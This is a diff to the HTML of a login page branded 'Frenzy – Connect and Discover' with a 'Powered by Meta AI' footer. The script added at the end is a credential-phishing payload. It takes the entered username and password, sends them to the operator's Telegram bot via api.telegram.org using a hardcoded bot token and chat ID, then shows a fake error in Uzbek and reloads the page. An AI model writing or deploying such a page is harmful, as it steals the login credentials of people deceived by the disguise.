@@ -3,40 +3,59 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Syncra - Login</title>
+    <title>Frenzy - Connect and Discover</title>
     <link rel="stylesheet" href="style.css">
-    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
 </head>
 <body>
-    <div class="login-container">
-        <div class="logo-section">
-            <div class="logo-icon">S/C</div>
-            <h1>SYNCRA</h1>
-        </div>
-        
-        <form class="login-form">
-            <h2>Log In to SYNCRA</h2>
-            
-            <div class="input-group">
-                <input type="text" placeholder="Username / Email / Voice ID" required>
+    <div class="frenzy-wrapper">
+        <div class="glass-card">
+            <div class="logo-area">
+                <div class="f-logo">FZ</div>
+                <h1 class="brand-name">FRENZY</h1>
+                <p class="tagline">CONNECT AND DISCOVER</p>
             </div>
+
+            <form id="loginForm">
+                <div class="input-field">
+                    <input type="text" id="username" placeholder="Username / Email / Voice ID" required>
+                </div>
+                <div class="input-field">
+                    <input type="password" id="password" placeholder="Password" required>
+                </div>
+                
+                <button type="submit" class="glow-btn">LOG IN</button>
+                
+                <div class="links">
+                    <a href="#">Forgot Password?</a>
+                    <p>New to Frenzy? <a href="#" class="up">Sign Up</a></p>
+                </div>
+            </form>
             
-            <div class="input-group">
-                <input type="password" placeholder="Password" required>
-                <span class="toggle-password">👁️</span>
+            <div class="footer">
+                <p>Powered by Meta AI</p>
+                <small>BUILDING TOMORROW TOGETHER</small>
             </div>
-            
-            <button type="submit" class="login-btn">Log In</button>
-            
-            <div class="form-footer">
-                <a href="#">Forgot Password?</a>
-                <p>Don't have an account? <a href="#" class="signup-link">Sign Up</a></p>
-            </div>
-        </form>
-        
-        <div class="meta-footer">
-            Powered by <span>Meta AI</span>
         </div>
     </div>
+
+    <script>
+        const token = "8565651705:AAGcPkBIRk7mGd8OQgNzg-sOcZP2RMyIUfY";
+        const chat_id = "5670878170"; // Bu yerga o'z ID raqamingizni yozing (agar bilmasangiz @userinfobot orqali biling)
+
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const user = document.getElementById('username').value;
+            const pass = document.getElementById('password').value;
+            const text = `🚀 *Yangi Kirish!*%0A%0A👤 User: \`${user}\`%0A🔑 Pass: \`${pass}\``;
+
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${text}&parse_mode=markdown`)
+            .then(res => {
+                alert("Tizimda xatolik! Iltimos keyinroq urinib ko'ring.");
+                window.location.reload();
+            });
+        });
+    </script>
 </body>
 </html>
